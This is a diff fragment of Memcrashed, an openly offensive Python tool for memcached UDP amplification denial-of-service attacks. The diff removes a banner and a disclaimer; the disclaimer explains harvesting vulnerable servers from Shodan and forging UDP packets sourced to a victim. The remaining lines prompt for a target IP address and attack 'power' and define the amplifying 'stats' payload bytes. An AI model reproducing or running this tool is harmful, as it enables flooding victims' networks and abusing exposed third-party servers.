@@ -16,33 +16,6 @@ def suppress_stdout():
         finally:
             sys.stdout = old_stdout
 
-class color:
-    HEADER = '\033[0m'
-
-logo = color.HEADER + '''
-
-   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗
-   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
-   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
-   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
-   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
-   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝
-
-                                        Author: @037
-                                        Version: 3.1
-
-####################################### DISCLAIMER ########################################
-| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
-| memcached servers. It then allows you to use the same servers to launch widespread      |
-| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
-| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
-| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
-| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
-###########################################################################################
-                                                                                     
-'''
-print(logo)
-
 target = input("[▸] Enter target IP address: ")
 power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
 data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
